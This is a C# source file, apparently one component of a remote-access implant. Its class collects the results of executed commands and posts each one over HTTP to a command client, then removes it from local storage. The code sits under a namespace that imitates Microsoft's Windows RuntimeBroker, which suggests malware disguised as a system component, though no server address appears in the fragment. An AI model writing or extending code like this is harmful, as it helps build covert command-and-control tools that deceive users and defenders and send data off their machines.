namespace Microsoft.RuntimeBroker.InternalServices.Impl
{
    internal class ResultSender: IResultSender
    {
        private readonly ICommandRepository _commandRepository;
        private readonly IHttpClientFactory _httpClientFactory;

        public ResultSender(ICommandRepository commandRepository, IHttpClientFactory httpClientFactory)
        {
            _commandRepository = commandRepository ?? throw new ArgumentNullException(nameof(commandRepository));
            _httpClientFactory = httpClientFactory ?? throw new ArgumentNullException(nameof(httpClientFactory));
        }

        public async Task WorkAsync(CancellationToken cancellationToken)
        {
            var completed = await _commandRepository.GetCompletedAsync(cancellationToken);
            foreach (var (command, execResult) in completed)
            {
                cancellationToken.ThrowIfCancellationRequested();

                var data = execResult.Serialize();
                try
                {
                    await SendAsync(execResult.CommandId, data, cancellationToken);
                    await _commandRepository.RemoveAsync(command, cancellationToken);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        private async Task SendAsync(uint commandId, byte[] data, CancellationToken cancellationToken)
        {
            var commandHttpClient = new CommandHttpClient(_httpClientFactory);
            var res = await commandHttpClient.SendCommandAsync(commandId, data, cancellationToken);
            if (res.Error != null)
                throw new Exception(res.Error.Code);
        }
    }
}
